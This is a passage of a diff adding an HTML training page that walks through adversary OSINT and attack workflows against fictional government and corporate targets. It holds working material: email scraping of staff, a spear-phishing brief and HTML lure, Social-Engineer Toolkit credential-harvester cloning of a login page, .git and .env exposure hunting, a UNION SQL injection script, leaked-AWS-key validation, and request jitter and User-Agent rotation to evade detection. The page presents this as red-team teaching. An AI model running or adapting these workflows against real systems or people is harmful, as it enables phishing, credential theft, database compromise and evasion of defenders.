+  "https://public-sector-summit.org/2024/attendees" | \
+  grep -oiE "[a-zA-Z0-9._%+-]+@target\.gov" | sort -u > conference_leads.txt
+
+# 2D: Certificate transparency logs for exposed infrastructure
+# (Identifies VPN portals, webmail, or dev boxes senior staff might use)
+$ theHarvester -d target.gov -b crtsh -f crtsh_hosts.txt
+</code></pre>
+
+        <!-- PHASE 3: PROCESS -->
+        <h3>Phase 3: Process, Map Relationships</h3>
+        
+		<p>Transform raw collection into structured, usable intelligence. Clean duplicates, infer hierarchies, and build a 
+		relationship graph.
+		</p>
+
+<pre><code class="language-bash">$ cd ~/apt_osint/process
+# 3A: Extract clean email lists from theHarvester JSON
+$ cat ../collect/theharvester_results.json | \
+  jq -r '.emails[]? // empty' | sort -u > clean_emails.txt
+
+# 3B: Extract discovered hosts for infrastructure correlation
+$ cat ../collect/theharvester_results.json | \
+  jq -r '.hosts[]? // empty' | sort -u > discovered_hosts.txt
+
+# 3C: Build a structured relationship CSV
+# Adversary infers: Jane Smith is assistant to John Doe from press release bios;
+# John Doe spoke at the summit; therefore, a summit-themed pretext is credible.
+$ cat <<'EOF' > relationship_graph.csv
+SourceEntity,RelationshipType,TargetEntity,Confidence,DataSource
+Jane Smith,ExecutiveAssistantTo,John Doe,High,Recon-ng/LinkedIn
+John Doe,SpeakerAt,PublicSectorSummit2024,High,ConferenceScrape
+John Doe,UsesPortal,vpn.target.gov,Medium,CRT/crt.sh
+Jane Smith,Attended,PublicSectorSummit2024,Medium,ConferenceScrape
+EOF
+
+# 3D: Visualize attack paths with Graphviz (install if needed: sudo apt install graphviz jq)
+$ cat &lt;&lt;'EOF' > build_graph.sh
+#!/bin/bash
+echo "digraph apt_killchain {" > relationships.dot
+echo "  rankdir=TB; node [shape=box, style=filled, fillcolor=lightblue];" >> relationships.dot
+while IFS=, read -r src rel tgt conf ref; do
+  [[ "$src" == "SourceEntity" ]] && continue
+  safe_rel=$(echo "$rel" | tr ' ' '_')
+  echo "  \"$src\" -> \"$tgt\" [label=\"$safe_rel\"];"
+done &lt; relationship_graph.csv >> relationships.dot
+echo "}" >> relationships.dot
+dot -Tpng relationships.dot -o relationship_map.png
+EOF
+$ chmod +x build_graph.sh
+$ ./build_graph.sh
+
+$ echo "[+] Relationship map generated: relationship_map.png"
+</code></pre>
+
+        <div class="reminder">
+          <strong>What the adversary sees in the graph:</strong><br>
+          Jane Smith has a <strong>high-trust line</strong> to John Doe. She also attended 
+          the same conference. Compromising her inbox first provides a trusted channel 
+          to send a "summit follow-up" to John Doe.
+        </div>
+
+        <!-- PHASE 4: DISSEMINATE -->
+        <h3>Phase 4: Disseminate, Develop Targeted Phishing Scenarios</h3>
+        
+		<p>Package the intelligence into a decision-ready attack product: a spear-phishing brief and the actual payload 
+		delivery mechanism.
+		</p>
+
+<pre><code class="language-bash">$ cd ~/apt_osint/disseminate
+# 4A: Generate a decision-ready intelligence brief (Markdown)
+$ cat <<'EOF' > spear_phish_brief.md
+# OPERATION: Public Sector Summit Follow-Up
+## Primary Target: John Doe (Director of IT)
+- **Entry Vector:** Jane Smith (Executive Assistant) -> Compromise her inbox first.
+- **Pretext:** Official post-summit photo gallery and contact requests.
+- **Emotional Leverage:** Professional networking and personal branding.
+- **Delivery Time:** Tuesday 08:30 AM (govt employees check email early).
+
+## Execution Chain
+1. Jane receives summit-themed phish -> captures credentials.
+2. Adversary accesses Jane's mailbox.
+3. Adversary sends internal "Urgent: John, your summit badge photo needs approval" from Jane's account.
+4. John clicks from a trusted internal sender.
+EOF
+
+# 4B: Build the phishing email template (HTML)
+$ cat <<'EOF' > spear_phish_template.html
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Summit Networking Portal&lt;/title&gt;&lt;/head&gt;
+&lt;body style="font-family: Arial, sans-serif;"&gt;
+  &lt;p&gt;Hi %FIRSTNAME%,&lt;/p&gt;
+  &lt;p&gt;Thank you for speaking at the Public Sector Innovation Summit.&lt;/p&gt;
+  &lt;p&gt;Your official headshot and new delegate connections are now available in the secure portal.&lt;/p&gt;
+  &lt;p&gt;&lt;a href="http://summit-networking.com/login" 
+        style="background:#2B6DC6;color:white;padding:12px;text-decoration:none;border-radius:4px;"&gt;
+        Access Summit Portal&lt;/a&gt;&lt;/p&gt;
+  &lt;p&gt;Regards,&lt;br&gt;Summit Coordination Team&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+EOF
+
+# 4C: Build the credential harvesting payload using SET (Social-Engineer Toolkit)
+# In Kali, run: sudo setoolkit
+# Select: 1) Social-Engineering Attacks
+#          2) Website Attack Vectors
+#          3) Credential Harvester Attack Method
+#          2) Site Cloner
+# Enter your attacker IP / listening URL
+# Enter target URL to clone: https://login.target.gov
+
+$ echo "[*] Dissemination package complete in ~/apt_osint/disseminate/"
+$ echo "[*] Next step: Load email_template.html into Gophish or send via SET."
+</code></pre>
+
+        <!-- Summary of Adversary Outputs -->
+        <h3>Summary of Adversary Outputs</h3>
+
+        <div class="iscsec-table-responsive">
+          <table class="iscsec-table" aria-label="Adversary Outputs Summary">
+            <thead>
+              <tr>
+                <th>File</th>
+                <th>Purpose</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>plan/intelligence_requirements.txt</code></td>
+                <td>Defines the "why" and scope of collection.</td>
+              </tr>
+              <tr>
+                <td><code>collect/theharvester_results.json</code></td>
+                <td>Raw emails and hosts supporting target discovery.</td>
+              </tr>
+              <tr>
+                <td><code>process/relationship_map.png</code></td>
+                <td>Visual graph showing trust paths and hierarchy.</td>
+              </tr>
+              <tr>
+                <td><code>disseminate/spear_phish_brief.md</code></td>
+                <td>Decision-ready product for the operator.</td>
+              </tr>
+              <tr>
+                <td><code>disseminate/spear_phish_template.html</code></td>
+                <td>The actual attack payload ready for delivery.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="reminder">
+          <strong>Adversary Outcome:</strong> This mirrors the structured APT mindset: 
+          <strong>Plan</strong> the requirement, <strong>Collect</strong> from public sources, 
+          <strong>Process</strong> it into a relationship graph, and <strong>Disseminate</strong> 
+          it as a ready-to-execute kill-chain package.
+        </div>
+
+        <!-- Example B: Vulnerability Research -->
+        <h3>Example B: Vulnerability Research</h3>
+        
+		<p><strong>Scenario:</strong> An attacker attempts to identify weaknesses within a specific web application.
+		</p>
+       
+	   <p>
+	   <strong>Cycle Application:</strong>
+	   </p>
+	   
+        <ul>
+          <li><strong>Plan:</strong> Identify the target technology stack.</li>
+          <li><strong>Collect:</strong> Search public repositories, technical forums, and internet-facing assets.</li>
+          <li><strong>Process:</strong> Analyze configurations for exposed credentials, weak permissions, or known weaknesses.</li>
+          <li><strong>Disseminate:</strong> Create a proof-of-concept demonstrating the identified issue.</li>
+        </ul>
+
+        <p>
+          Below is a practical Kali Linux workflow for <strong>Example B: Vulnerability Research</strong>, 
+          executing each step of the OSINT cycle against a fictional target web application 
+          (<code>target-app.com</code>) from a red-team perspective.
+        </p>
+
+        <div class="reminder" style="margin-bottom: 20px; background: #ffebee; border-left: 4px solid #f44336; padding: 16px 20px; border-radius: 4px;">
+          <strong style="color: #b71c1c;">AUTHORIZED USE ONLY:</strong>
+          <span style="color: #b71c1c;">
+            Use only on assets you own or are authorized to test. Unauthorized scanning 
+            or exploitation may constitute a criminal offense.
+          </span>
+        </div>
+
+        <!-- Vulnerability Research Phase 1: Plan -->
+        <h3>Phase 1: Plan, Identify the Target Technology Stack</h3>
+        
+		<p>Define the scope and fingerprint the application to know what you are hunting for.
+		</p>
+
+<pre><code class="language-bash"># Create workspace
+$ mkdir -p ~/vuln_research/{plan,collect,process,disseminate}
+$ cd ~/vuln_research/plan
+
+# Define target scope
+$ echo "target-app.com" > scope.txt
+
+# 1A: Web fingerprinting (server, frameworks, CMS, JS libraries)
+$ whatweb -a 3 https://target-app.com | tee whatweb.txt
+
+# 1B: Deep service detection with Nmap
+$ sudo nmap -sV -p 80,443 --script=http-title,http-enum,http-headers target-app.com -oN nmap_web.txt
+
+# 1C: Wappalyzer-style stack detection
+# Example output from whatweb we need to record:
+$ cat <<'EOF' > tech_stack.txt
+TARGET: target-app.com
+TECHNOLOGIES DETECTED:
+  - Server: nginx/1.18.0
+  - Framework: PHP/7.4.3
+  - Frontend: React 17.0.2
+  - CMS: WordPress 6.2 (sub-domain blog.target-app.com)
+  - Database indicators: phpMyAdmin references found
+  - Cloud: AWS S3 referenced in page source
+INTELLIGENCE REQUIREMENTS:
+  1. Exposed source code (public repos matching "target-app")
+  2. Default/config files (.env, .git, config.bak)
+  3. Known CVEs for nginx 1.18.0, PHP 7.4.3, WordPress 6.2
+EOF
+</code></pre>
+
+        <!-- Vulnerability Research Phase 2: Collect -->
+        <h3>Phase 2: Collect, Search Public Repos, Forums, and Internet-Facing Assets</h3>
+        
+		<p>Harvest artifacts that reveal implementation details, misconfigurations, or leaked credentials.
+		</p>
+
+<pre><code class="language-bash">$ cd ~/vuln_research/collect
+# 2A: Subdomain enumeration to find forgotten assets (dev, staging, admin panels)
+$ subfinder -d target-app.com -o subdomains.txt
+
+# 2B: Discover archived and hidden endpoints via Wayback Machine
+$ echo "target-app.com" | waybackurls | sort -u > wayback_endpoints.txt
+
+# 2C: Search for exposed Git repositories (source code exposure)
+$ curl -s -o /dev/null -w "%{http_code}" https://target-app.com/.git/HEAD
+# If return code is 200:
+# git-dumper https://target-app.com ./git_dump_target
+
+# 2D: Hunt for exposed configuration files
+$ for file in .env config.php.bak .htaccess aws.yml docker-compose.yml; do
+  curl -s -o /dev/null -w "URL: https://target-app.com/$file - Status: %{http_code}\n" \
+    "https://target-app.com/$file"
+done | tee exposed_configs.txt
+
+# 2E: GitHub OSINT - search public repos for leaked credentials
+$ curl -s "https://api.github.com/search/code?q=target-app.com+password+in:file" \
+  -H "Accept: application/vnd.github.v3+json" | tee github_raw.json
+
+# 2F: Search technical forums for developer leaks
+$ curl -s "https://www.google.com/search?q=target-app.com+error+database+connection" \
+  -A "Mozilla/5.0" | grep -oP 'https://[^&lt;]+' | tee forum_leaks.txt
+  </code></pre>
+
+        <!-- Vulnerability Research Phase 3: Process -->
+        <h3>Phase 3: Process, Analyze Configurations for Exposed Credentials, Weak Permissions, and Known Weaknesses</h3>
+        
+		<p>
+		Turn raw collection into actionable intelligence. Correlate versions with vulnerabilities and grep for secrets.
+		</p>
+
+<pre><code class="language-bash">$ cd ~/vuln_research/process
+# 3A: If Git repo was dumped, mine it for secrets immediately
+# grep -ri "password\|secret\|api_key\|AWS_ACCESS_KEY_ID" ~/vuln_research/collect/git_dump_target/ \
+#   > potential_secrets.txt
+
+# 3B: Analyze exposed .env file for hardcoded DB/API credentials
+$ cat &lt;&lt;'EOF' > found_env.env
+DB_HOST=mysql.target-app.internal
+DB_USER=root
+DB_PASS=ProdPass123!
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+EOF
+$ grep -E "PASS|SECRET|KEY|TOKEN" found_env.env > confirmed_exposed_creds.txt
+
+# 3C: Analyze Nginx/PHP version for known CVEs
+$ searchsploit nginx 1.18.0 | tee nginx_exploits.txt
+$ searchsploit php 7.4 | tee php_exploits.txt
+$ searchsploit WordPress 6.2 | tee wp_exploits.txt
+
+# 3D: Check discovered endpoints for IDOR or sensitive patterns
+$ cat ../collect/wayback_endpoints.txt | grep -iE "admin|api|config|backup|dump|source" \
+  > sensitive_endpoints.txt
+
+# 3E: Generate a vulnerability hypothesis document
+$ cat &lt;&lt;'EOF' > analysis_report.txt
+=== VULNERABILITY RESEARCH ANALYSIS ===
+TARGET: target-app.com
+
+FINDING 1: EXPOSED CREDENTIALS
+  - Source: https://target-app.com/.env (Status 200)
+  - Detail: Database root password and AWS IAM keys exposed.
+  - Impact: Full database compromise, cloud lateral movement.
+
+FINDING 2: SOURCE CODE EXPOSURE
+  - Source: https://target-app.com/.git/ (Status 200)
+  - Detail: Entire application repository downloadable.
+  - Impact: Source code review reveals SQL injection in /api/v1/search.php.
+
+FINDING 3: KNOWN SOFTWARE WEAKNESS
+  - Software: PHP 7.4.3
+  - CVE: CVE-2019-11043 (PHP-FPM RCE under specific configs)
+  - Note: Nginx config review from repo suggests vulnerable path_info handling.
+EOF
+</code></pre>
+
+        <!-- Vulnerability Research Phase 4: Disseminate -->
+        <h3>Phase 4: Disseminate, Create a Proof-of-Concept</h3>
+        
+		<p>
+		Build a minimal, working PoC that proves the finding and demonstrates impact without causing damage.
+		</p>
+
+        <h4>4A: PoC 1 — Exposed .env Credential Validator</h4>
+        
+<pre><code class="language-bash">$ cd ~/vuln_research/disseminate
+# A simple script that tests if the leaked AWS key is active
+$ cat <<'PYEOF' > poc_exposed_aws_creds.py
+#!/usr/bin/env python3
+import boto3
+from botocore.exceptions import ClientError
+
+def verify_aws_key(access_key, secret_key):
+    try:
+        # Attempt to use STS GetCallerIdentity (harmless read-only call)
+        client = boto3.client(
+            'sts',
+            aws_access_key_id=access_key,
+            aws_secret_access_key=secret_key
+        )
+        resp = client.get_caller_identity()
+        print(f"[+] VALID CREDENTIALS - Account: {resp['Account']}, ARN: {resp['Arn']}")
+        return True
+    except ClientError as e:
+        print(f"[-] Invalid or blocked: {e}")
+        return False
+
+if __name__ == "__main__":
+    # Values extracted from https://target-app.com/.env
+    KEY_ID = "AKIAIOSFODNN7EXAMPLE"
+    SECRET   = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+    verify_aws_key(KEY_ID, SECRET)
+PYEOF
+$ chmod +x poc_exposed_aws_creds.py
+</code></pre>
+
+        <h4>4B: PoC 2 — SQL Injection via Source Code Review Finding</h4>
+        
+		<p>
+		<em>Discovered in dumped <code>/api/v1/search.php</code> source: <code>"$query = 'SELECT * FROM products WHERE 
+		name LIKE \'%'.$_GET['q'].'\'';"</code></em>
+		</p>
+
+<pre><code class="language-bash">$ cat &lt;&lt;'PYEOF' > poc_sqli.py
+#!/usr/bin/env python3
+import requests
+import urllib.parse
+
+TARGET = "https://target-app.com/api/v1/search.php"
+# Classic UNION-based proof-of-concept to extract DB version
+PAYLOAD = "' UNION SELECT null,null,@@version,null,null-- -"
+
+def run_poc():
+    url = f"{TARGET}?q={urllib.parse.quote(PAYLOAD)}"
+    print(f"[*] Firing request to: {url}")
+    r = requests.get(url, timeout=10)
+    
+    if "5.7.38" in r.text or "MariaDB" in r.text or "mysql" in r.text.lower():
+        print("[+] PoC Successful - Database version leaked in response:")
+        print(r.text[:500])
+    else:
+        print("[-] Target may not be vulnerable or WAF intervened.")
+        print(r.status_code)
+
+if __name__ == "__main__":
+    run_poc()
+PYEOF
+$ chmod +x poc_sqli.py
+</code></pre>
+
+        <h4>4C: PoC 3 — Git Exposure Validator</h4>
+        
+<pre><code class="language-bash">$ cat <<'EOF' > poc_exposed_git.sh
+#!/bin/bash
+TARGET="https://target-app.com"
+HEAD_URL="$TARGET/.git/HEAD"
+
+echo "[*] Checking for exposed Git repository..."
+HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$HEAD_URL")
+
+if [ "$HTTP_CODE" == "200" ]; then
+    echo "[+] EXPOSED: $HEAD_URL is reachable (HTTP $HTTP_CODE)"
+    curl -s "$HEAD_URL"
+    echo -e "\n[*] Attempting to read latest commit..."
+    curl -s "$TARGET/.git/logs/HEAD" | head -n 3
+else
+    echo "[-] NOT EXPOSED: Received HTTP $HTTP_CODE"
+fi
+EOF
+$ chmod +x poc_exposed_git.sh
+</code></pre>
+
+        <h4>4D: Operator Dissemination Brief</h4>
+        
+<pre><code class="language-bash">$ cat <<'EOF' > vulnerability_poc_brief.md
+# VULNERABILITY RESEARCH BRIEF
+**Target:** target-app.com  
+**Date:** $(date +%Y-%m-%d)  
+**Analyst:** Red Team Operator
+
+## EXECUTIVE SUMMARY
+Passive and semi-active reconnaissance identified three critical weaknesses 
+stemming from poor operational security in public-facing assets and source code management.
+
+## FINDINGS &amp; PROOFS
+
+1. CRITICAL - Hardcoded Cloud Credentials Exposed via `.env`
+   - **Evidence:** `found_env.env` captured from `https://target-app.com/.env`
+   - **PoC:** Run `./poc_exposed_aws_creds.py` to validate live AWS key.
+   - **Impact:** Cloud lateral movement, data exfiltration, infrastructure takeover.
+
+2. CRITICAL - Source Code Exposure via `.git`
+   - **Evidence:** Git repository downloadable in full.
+   - **PoC:** Run `./poc_exposed_git.sh` to confirm exposure and extract commit logs.
+   - **Impact:** Intellectual property theft, whitebox vulnerability discovery.
+
+3. HIGH - SQL Injection in `/api/v1/search.php`
+   - **Evidence:** Identified in dumped source code (unsanitized \$_GET['q'])
+   - **PoC:** Run `./poc_sqli.py` to extract database version via UNION injection.
+   - **Impact:** Full database dump, authentication bypass.
+
+## RECOMMENDED NEXT STEP
+Use Finding 3 (SQLi) to establish initial foothold, or leverage Finding 1 (AWS keys) 
+for direct cloud access without touching the web application perimeter.
+EOF
+
+$ echo "[+] Dissemination package complete in ~/vuln_research/disseminate/"
+</code></pre>
+
+        <!-- Vulnerability Research Summary -->
+        <h3>Summary of Outputs</h3>
+
+        <div class="iscsec-table-responsive">
+          <table class="iscsec-table" aria-label="Vulnerability Research Outputs Summary">
+            <thead>
+              <tr>
+                <th>Phase</th>
+                <th>File</th>
+                <th>Purpose</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Plan</strong></td>
+                <td><code>tech_stack.txt</code></td>
+                <td>Baseline of technologies to hunt for.</td>
+              </tr>
+              <tr>
+                <td><strong>Collect</strong></td>
+                <td><code>subdomains.txt</code>, <code>wayback_endpoints.txt</code>, <code>found_env.env</code></td>
+                <td>Raw data from public repos, archives, and exposed configs.</td>
+              </tr>
+              <tr>
+                <td><strong>Process</strong></td>
+                <td><code>analysis_report.txt</code></td>
+                <td>Correlated vulnerabilities and validated exposures.</td>
+              </tr>
+              <tr>
+                <td><strong>Disseminate</strong></td>
+                <td><code>poc_exposed_aws_creds.py</code>, <code>poc_sqli.py</code>, <code>poc_exposed_git.sh</code>, <code>vulnerability_poc_brief.md</code></td>
+                <td>Working proof-of-concept scripts and the operator decision brief.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="reminder">
+          <strong>Adversary Outcome:</strong> This demonstrates how an adversary (or red team) 
+          uses only OSINT and lightweight validation to move from a URL to a working 
+          exploit package without brute-forcing or heavy scanning. Source code exposure and 
+          leaked environment files often provide a faster, stealthier path to compromise than direct 
+          application exploitation.
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION: KEY TOOLS USED (10)                                  -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="tools-adversary">
+        <h2 id="tools-adversary">Key Tools Used in This Phase</h2>
+
+        <div class="iscsec-table-responsive">
+          <table class="iscsec-table" aria-label="Adversary OSINT Tools Matrix">
+            <thead>
+              <tr>
+                <th>Tool Category</th>
+                <th>Specific Tools</th>
+                <th>Purpose in the Cycle</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Visualization</strong></td>
+                <td>Maltego, SpiderFoot</td>
+                <td>Visualizes relationships between people, domains, organizations, and infrastructure.</td>
+              </tr>
+              <tr>
+                <td><strong>Automated Collection</strong></td>
+                <td>theHarvester, Recon-ng</td>
+                <td>Automates the collection of emails, hosts, usernames, and public intelligence.</td>
+              </tr>
+              <tr>
+                <td><strong>Data Aggregation</strong></td>
+                <td>FullContact, Clearbit</td>
+                <td>Enriches existing profiles with additional contextual information.</td>
+              </tr>
+              <tr>
+                <td><strong>Knowledge Management</strong></td>
+                <td>Obsidian, Notion, Evernote</td>
+                <td>Stores and organizes intelligence for later analysis and dissemination.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION: POTENTIAL PAYLOADS & OUTPUTS (11)                    -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="payloads-outputs">
+        <h2 id="payloads-outputs">10. Potential Payloads &amp; Outputs</h2>
+        
+		<p>
+		During this phase, outputs are typically structured intelligence products that support later operational activities.
+		</p>
+
+        <h3>A. Relationship Graphs (Visual Intelligence)</h3>
+        
+		<p>
+		<strong>Adversary Use:</strong> Identifies trust relationships and potential indirect attack paths.
+		</p>
+        
+		<p><strong>Scenario:</strong> The adversary has processed multiple collections and must visualize a path from an 
+		external consultant to the CEO to select a trusted pretext.
+		</p>
+
+        <h4>Step 1 — Structure discovered relationships into a machine-readable edge list</h4>
+        
+<pre><code class="language-bash">$ cat &lt;&lt;'EOF' > ceo_relationships.csv
+SourceEntity,RelationshipType,TargetEntity,Confidence
+CEO@TargetCorp.com,DirectReports,CTO@TargetCorp.com,High
+CEO@TargetCorp.com,DirectReports,CFO@TargetCorp.com,High
+CEO@TargetCorp.com,AttendedConferenceWith,ExternalConsultant@FirmX.com,Medium
+ExternalConsultant@FirmX.com,AdvisoryBoard,TargetCorp.com,Medium
+EOF
+</code></pre>
+
+        <h4>Step 2 — Render a visual graph via Graphviz</h4>
+
+<pre><code class="language-bash">$ cat &lt;&lt;'EOF' > build_rel_graph.sh
+#!/bin/bash
+echo "digraph target_relationships {" > rel_graph.dot
+echo "  rankdir=TB; node [shape=box, style=filled, fillcolor=lightblue];" >> rel_graph.dot
+while IFS=, read -r src rel tgt conf; do
+  [[ "$src" == "SourceEntity" ]] && continue
+  safe_rel=$(echo "$rel" | tr ' ' '_')
+  echo "  \"$src\" -> \"$tgt\" [label=\"$safe_rel\", color=red];"
+done &lt; ceo_relationships.csv >> rel_graph.dot
+echo "}" >> rel_graph.dot
+dot -Tpng rel_graph.dot -o relationship_graph.png
+EOF
+$ chmod +x build_rel_graph.sh
+$ ./build_rel_graph.sh
+</code></pre>
+
+        <p>
+		<strong>Expected Output:</strong>
+		</p>
+
+<pre><code class="language-text">[+] Generated relationship_graph.png
+[+] Central Node: CEO@TargetCorp.com
+[+] Connected Nodes: CTO, CFO, ExternalConsultant@FirmX.com
+[+] Relationship: Attended Same Conference
+</code></pre>
+
+        <div class="info-remember">
+          <strong>Explanation:</strong><br>
+          Graphviz converts structured CSV relationships into a directed graph. The 
+          adversary uses this visual output to confirm that compromising 
+          <code>ExternalConsultant@FirmX.com</code> creates a believable trusted path 
+          to the CEO via a shared conference pretext.
+        </div>
+
+        <h3>B. Enriched Target Lists</h3>
+        
+		<p>
+		<strong>Adversary Use:</strong> Provides structured intelligence for phishing, password attacks, or 
+		social-engineering operations.
+		</p>
+        
+		<p>
+		<strong>Scenario:</strong> The adversary has collected raw contacts from multiple sources and must produce a 
+		deduplicated, enriched target list for operator review.
+		</p>
+
+        <h4>Step 1 — Generate a structured target enrichment list</h4>
+
+<pre><code class="language-bash">$ cat &lt;&lt;'EOF' > enriched_targets.csv
+Name,Email,Role,Phone,LinkedIn_URL,Breach_Status
+Jane Doe,jane.doe@target.com,CTO,+1-555-0199,linkedin.com/in/janedoe,Found in Breach
+John Smith,john.smith@target.com,DevOps,+1-555-0198,N/A,No Breach Data
+EOF
+</code></pre>
+
+        <h4>Step 2 — Validate CSV integrity and count records</h4>
+
+<pre><code class="language-bash">$ wc -l enriched_targets.csv && head -n 3 enriched_targets.csv
+</code></pre>
+
+        <p>
+		<strong>Expected Output:</strong>
+		</p>
+        
+<pre><code class="language-text">3 enriched_targets.csv
+Name,Email,Role,Phone,LinkedIn_URL,Breach_Status
+Jane Doe,jane.doe@target.com,CTO,+1-555-0199,linkedin.com/in/janedoe,Found in Breach
+</code></pre>
+
+        <div class="info-remember">
+          <strong>Explanation:</strong><br>
+          A unified CSV allows automated tools (Gophish, GoPhish, or custom scripts) 
+          to ingest targets directly. The <code>Breach_Status</code> column flags which 
+          accounts are likely to have credential-reuse vulnerabilities.
+        </div>
+
+        <h3>C. Hypothesis Documents</h3>
+        
+		<p><strong>Adversary Use:</strong> Focuses future collection and validation efforts on a specific technology or 
+		attack surface.
+		</p>
+        
+		<p><strong>Scenario:</strong> During collection, multiple references to AWS S3 were identified. The adversary 
+		documents a testable hypothesis to prioritize validation resources.
+		</p>
+
+        <h4>Step 1 — Draft a decision-ready hypothesis document</h4>
+        
+<pre><code class="language-bash">$ cat &lt;&lt;'EOF' > hypothesis_aws_s3.md
+# Intelligence Hypothesis: Exposed AWS S3 Buckets
+
+**Target:** TargetCorp
+**Analyst:** Red Team Operator
+**Date:** $(date +%Y-%m-%d)
+
+## Hypothesis
+TargetCorp may expose AWS S3 buckets due to misconfigured permissions.
+
+## Evidence
+Multiple public references discovered during search-engine reconnaissance:
+- Publicly accessible bucket URLs referenced in GitHub repositories.
+- Legacy subdomains pointing to S3 static hosting endpoints.
+- Document metadata revealing AWS account IDs.
+
+## Validation Requirements
+- [ ] Run `aws s3 ls` against identified bucket names.
+- [ ] Check bucket policies for `Principal: *` entries.
+- [ ] Enumerate bucket ACLs for public read permissions.
+
+## Impact if Confirmed
+Direct data exfiltration, PII exposure, potential lateral movement via IAM policies.
+EOF
+</code></pre>
+
+        <p>
+		<strong>Expected Output:</strong>
+		</p>
+        
+<pre><code class="language-text">[+] Generated hypothesis_aws_s3.md
+[+] Hypothesis: TargetCorp may expose AWS S3 buckets due to misconfigured permissions.
+[+] Evidence: Multiple public references discovered during search-engine reconnaissance.
+</code></pre>
+
+        <div class="info-remember">
+          <strong>Explanation:</strong><br>
+          Hypothesis documents prevent "random clicking." They force the adversary to 
+          articulate what they believe, why they believe it, and what specific evidence 
+          would confirm or deny the assumption before committing to exploitation.
+        </div>
+
+        <h3>Summary of Structured Outputs</h3>
+
+        <div class="iscsec-table-responsive">
+          <table class="iscsec-table" aria-label="Structured Outputs Summary">
+            <thead>
+              <tr>
+                <th>Output Type</th>
+                <th>Purpose</th>
+                <th>Example Format</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Relationship Graphs</strong></td>
+                <td>Visualize trust paths and indirect attack chains</td>
+                <td>PNG/SVG via Graphviz, CSV edge lists</td>
+              </tr>
+              <tr>
+                <td><strong>Enriched Target Lists</strong></td>
+                <td>Structured data for phishing and social engineering</td>
+                <td>CSV with Name, Email, Role, Breach Status</td>
+              </tr>
+              <tr>
+                <td><strong>Hypothesis Documents</strong></td>
+                <td>Focused assumptions requiring controlled validation</td>
+                <td>Markdown briefs with evidence and next steps</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION: ADVERSARY COUNTERMEASURES (12)                       -->
+      <!-- ============================================================ -->
+
+      <section aria-labelledby="adversary-countermeasures">
+        <h2 id="adversary-countermeasures">11. Adversary Countermeasures (Avoiding Detection)</h2>
+        
+		<div class="reminder-opsec">
+		Professional adversaries often employ operational security (OPSEC) measures to reduce visibility during 
+		intelligence collection.
+		</div>
+
+        <h3>Rate Limiting: Spreading Requests Over Time</h3>
+        
+		<p>
+		<strong>Scenario:</strong> The adversary must resolve a large subdomain list without triggering rate limits, 
+		WAF rules, or SIEM correlation alerts.
+		</p>
+
+        <h4>Step 1 — Enumerate subdomains with variable delays</h4>
+        
+<pre><code class="language-bash">$ for sub in $(cat subdomains.txt); do
+    host "$sub" > /dev/null 2>&1
+    sleep $((RANDOM % 4 + 2))
+  done
+</code></pre>
+
+        <p><strong>Expected Output:</strong></p>
+        
+<pre><code class="language-text">[*] Queries distributed across variable intervals (2–5 seconds).
+[*] No single burst exceeds the target's rate-limiting threshold.
+</code></pre>
+
+        <div class="info-remember">
+          <strong>Explanation:</strong><br>
+          <code>$((RANDOM % 4 + 2))</code> generates a random sleep between 2 and 5 
+          seconds. Jitter prevents predictable scanning patterns that time-based 
+          detection logic and WAF velocity rules commonly flag.
+        </div>
+
+        <h3>User-Agent Rotation: Altering Browser Signatures</h3>
+        
+		<p>
+		<strong>Scenario:</strong> The adversary must avoid attribution based on a static User-Agent string during repeated 
+		HTTP requests to the target application.
+		</p>
+
+        <h4>Step 1 — Rotate User-Agents from a predefined list</h4>
+        
+<pre><code class="language-bash">$ UAS=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
+$ for ua in "${UAS[@]}"; do
+    curl -s -A "$ua" -o /dev/null -w "%{http_code}\n" "https://target-app.com/"
+    sleep 1
+  done
+</code></pre>
+
+        <p>
+		<strong>Expected Output:</strong>
+		</p>
+        
+<pre><code class="language-text">200
+200
+200
+</code></pre>
+
+        <div class="info-remember">
+          <strong>Explanation:</strong><br>
+          Rotating the <code>-A</code> (User-Agent) header fragments the request signature 
+          across multiple apparent devices and operating systems. This reduces the 
+          likelihood of fingerprint-based blocking or SIEM rule matches that key on 
+          static client indicators.
+        </div>
+
+        <h3>Data Triangulation: Validating Across Multiple Sources</h3>
+        
+		<p>
+		<strong>Scenario:</strong> The adversary identifies a potential email address via a single source and must confirm 
+		it exists via a second, independent source before inclusion in the target list.
+		</p>
+
+        <h4>Step 1 — Cross-reference two independent datasets</h4>
+        
+<pre><code class="language-bash">$ grep -i "jane.doe@target.com" github_results.txt > source_a.txt
+$ grep -i "jane.doe@target.com" theharvester_emails.txt > source_b.txt
+
+# Confirm presence in both sources
+$ comm -12 &lt;(sort source_a.txt) &lt;(sort source_b.txt)
+</code></pre>
+
+        <p>
+		<strong>Expected Output:</strong>
+		</p>
+        
+<pre><code class="language-text">jane.doe@target.com
+</code></pre>
+
+        <div class="info-remember">
+          <strong>Explanation:</strong><br>
+          <code>comm -12</code> compares two sorted files and outputs only lines present 
+          in both. Adversaries use triangulation to validate that an email address was 
